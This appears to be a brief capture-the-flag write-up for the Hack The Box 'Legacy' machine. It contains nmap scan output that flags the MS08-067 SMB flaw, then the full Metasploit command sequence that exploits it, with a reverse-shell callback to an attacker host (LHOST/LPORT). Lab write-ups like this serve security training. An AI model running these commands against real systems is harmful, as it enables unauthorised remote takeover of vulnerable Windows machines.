# HTB Legacy Writeup (MS08-067)

## Nmap

```
nmap -sC -sV -oN initial.txt 10.129.221.131
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

OS: Windows XP SP3
```

## Vulnerability Scan
```
nmap --script=smb-vuln* 10.129.221.131
smb-vuln-ms08-067: VULNERABLE
CVE-2008-4250
```
## Exploit
```
msfconsole
msf exploit(windows/smb/ms08_067_netapi) > search cve:2008-4250
use exploit/windows/smb/ms08_067_netapi
show options
set RHOSTS 10.129.221.131
set LHOST 10.10.14.45
set LPORT 4445
run
```
